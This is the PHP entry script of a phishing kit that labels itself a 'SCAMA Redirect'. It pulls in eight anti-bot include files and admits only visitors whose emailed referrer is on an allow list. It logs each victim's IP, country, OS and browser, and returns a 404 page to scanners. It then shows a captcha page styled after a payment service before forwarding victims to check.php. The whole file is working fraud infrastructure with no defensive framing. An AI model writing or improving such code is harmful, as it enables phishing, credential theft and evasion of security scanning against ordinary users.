<?php
session_start();

// --> #SCAMA Redirect Dont use any ather Redirect =D    ###
require 'config.php';
require 'funcations.php';
require 'anti1.php';
require 'anti2.php';
require 'anti3.php';
require 'anti4.php';
require 'anti5.php';
require 'anti6.php';
require 'anti7.php';
require 'anti8.php';
if (!isset($_GET['referrer'])&&!isset($_GET['csrftoken'])) {
     exit(header('HTTP/1.0 404 Not Found'));
}
$viclang = getLanguage();
require 'languages/'.$viclang.'.php';
$_SESSION['language']=getLanguage();
$_SESSION['ip']=clientData('ip');
$_SESSION['ip_countryName']=clientData('country');
$_SESSION['os']=getOs();
$_SESSION['browser']=getBrowser();
$vicref=$_GET['referrer'];
if (strpos($vicref, "@")){
$vicref=explode('@', $vicref);
$vicref=$vicref[1];
$vicref=explode('.', $vicref);
$vicref=$vicref[0];
}

$_SESSION['referrer'] = $vicref;

if(in_array($vicref,$allowed_referers)){
	date_default_timezone_set('GMT');
	$dateNow=date("d/m/Y h:i:s A");
	$code="{$_SESSION['ip']} | {$dateNow} | {$_SESSION['ip_countryName']} | {$_SESSION['os']} | {$_SESSION['browser']} | {$_SESSION['referrer']}\r\n";
	$save=fopen("log.txt","a+");
	fwrite($save,$code);
	fclose($save);
	$csrftoken = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
	$_SESSION['csrftoken'] = $csrftoken;
		exit(header("Location: ?csrftoken=".$_SESSION['csrftoken'].""));
		}


if ($_SESSION['csrftoken'] !== $_GET['csrftoken']) {
	     exit(header('HTTP/1.0 404 Not Found'));
	     }
 if ($_SESSION['csrftoken'] == $_GET['csrftoken']) {
 	if ($show_captchaa!=="yes") {
	$newtoken = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
	$_SESSION['newtoken'] = $newtoken;
		exit(header("Location: check.php?newtoken=".$_SESSION['newtoken'].""));
 	?>
<?php }else{ ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
	<link rel="shortcut icon" href="css/logo.ico" />
	<link rel="stylesheet" href="css/xppx.css" />
	<title><?php echo $lg_captcha['title']?></title>
</head>
<body>
	<div class="contentContainer" id="content">
		<div class="safeComponent" data-nemo="safeStartPage"> 
			<header><div class="xysx-logo"></div> </header>
			<h1><?php echo $lg_captcha['head']?></h1>
			<br>
</div>   <form action="check.php" method="post">
   							<div style="transform: scale(0.9);">
<div class="g-recaptcha" data-sitekey="<?php echo $captcha_site_key; ?>"></div>
						</div>

	<button type="submit" id="xyssubmitsecx" name="safeContinueButton" class="button safeContinueButton primary" value="<?php echo $lg_captcha['bt_secure']?>"><?php echo $lg_captcha['bt_secure']?></button>
	   </form> 

	<!-- The function is executed when the user presses this button -->
</body>
<script src='https://www.google.com/recaptcha/api.js'></script>
</body>
</html>
<?php
}
}
?>